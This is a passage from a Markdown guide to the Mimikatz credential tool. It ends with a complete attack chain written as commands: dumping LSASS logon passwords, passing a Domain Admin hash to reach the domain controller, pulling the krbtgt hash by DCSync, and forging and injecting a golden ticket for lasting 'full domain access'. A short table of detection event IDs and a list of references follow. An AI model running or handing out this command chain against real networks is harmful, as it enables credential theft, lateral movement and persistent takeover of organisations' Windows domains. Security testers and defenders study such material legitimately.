mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::tspkg
mimikatz # sekurlsa::tickets /export
```

---

### Example 10: Complete Attack Chain Summary

```
# Phase 1: Initial Access (assuming you have admin on workstation)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# Found: Domain Admin hash

# Phase 2: Lateral Movement via Pass-the-Hash
mimikatz # sekurlsa::pth /user:DomainAdmin /domain:corp.local /ntlm:<hash> /run:cmd.exe
# Access DC

# Phase 3: DCSync for krbtgt
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local
# Obtained: krbtgt hash and SID

# Phase 4: Persistence via Golden Ticket
mimikatz # kerberos::golden /user:PersistentAdmin /domain:corp.local /sid:<SID> /krbtgt:<hash> /ticket:golden.kirbi

# Phase 5: Use Golden Ticket anytime
mimikatz # kerberos::ptt golden.kirbi
# Full domain access for 10 years
```

---

## Detection and Logging Considerations

| Technique | Event IDs | Detection Notes |
|-----------|-----------|-----------------|
| Credential Dumping | 4656, 4663 | LSASS access |
| Pass-the-Hash | 4624 (Type 9) | NTLM with special logon |
| Golden Ticket | 4769 | Service ticket with anomalies |
| DCSync | 4662 | DS-Replication-Get-Changes rights |
| Silver Ticket | N/A | No DC contact (hard to detect) |

---

## References

- [Official Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Mimikatz GitHub Repository](https://github.com/gentilkiwi/mimikatz)
- [Active Directory Security - Mimikatz Guide](https://adsecurity.org/?page_id=1821)
- [HackTricks - Mimikatz](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/credentials-mimikatz.html)
